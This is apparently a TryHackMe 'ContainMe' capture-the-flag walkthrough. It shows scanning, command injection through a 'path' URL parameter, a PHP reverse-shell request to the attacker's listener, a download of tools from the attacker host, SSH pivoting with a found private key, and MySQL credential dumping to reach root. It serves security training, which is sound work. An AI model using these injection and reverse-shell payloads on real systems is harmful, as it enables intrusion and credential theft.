# ContainMe

**Room Link:** [https://tryhackme.com/room/containme1](https://tryhackme.com/room/containme1)

### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



### TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Burp Request**

```
GET /index.php?path=;id HTTP/1.1
Host: 10.10.108.33
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Initial Shell

**Kali**

```
nc -lvnp 1337
```

**Burp Request**

```
GET /index.php?path=;php+-r+'$sock%3dfsockopen("$KALI",1337)%3bexec("sh+<%263+>%263+2>%263")%3b' HTTP/1.1
Host: 10.10.128.4
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

<figure><img src="../../.gitbook/assets/image (455).png" alt=""><figcaption></figcaption></figure>

Get autocomplete

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```



**Victim**

```
find / -perm -u=s -type f 2> /dev/null 
/usr/share/man/zh_TW/crypt mike
```

<figure><img src="../../.gitbook/assets/image (456).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (457).png" alt=""><figcaption></figcaption></figure>



**Kali**

```
git clone https://github.com/andrew-d/static-binaries.git
cd static-binaries/binaries/linux/x86_64
python2 -m SimpleHTTPServer 81
```

**Victim**

```
cd /tmp/
wget http://$KALI:81/nmap
chmod +x nmap
./nmap 172.16.20.0/24 -Pn
```

<figure><img src="../../.gitbook/assets/image (458).png" alt=""><figcaption></figcaption></figure>

Mike has a ssh key so I tried logging into the other server with that and it worked.

**Victim**

```
ssh mike@172.16.20.6 -i /home/mike/.ssh/id_rsa
```

<figure><img src="../../.gitbook/assets/image (459).png" alt=""><figcaption></figcaption></figure>

## **Privilege Escalation**&#x20;

**Victim**

```
ss -ltp 
```

<figure><img src="../../.gitbook/assets/image (461).png" alt=""><figcaption></figcaption></figure>

Password was password, just guessed it.

**Victim(mysql)**

```
mysql -ppassword 
show databases; 
use accounts;  
select * from users ;
```



<figure><img src="../../.gitbook/assets/image (460).png" alt=""><figcaption></figcaption></figure>

**Victim**

<pre><code><strong>su root
</strong>Password: bjsig4868fgjjeog
</code></pre>

<figure><img src="../../.gitbook/assets/image (462).png" alt=""><figcaption></figcaption></figure>

**Victim**

<pre><code><strong>cd /root
</strong><strong>unzip mike.zip
</strong><strong>Password: WhatAreYouDoingHere
</strong></code></pre>









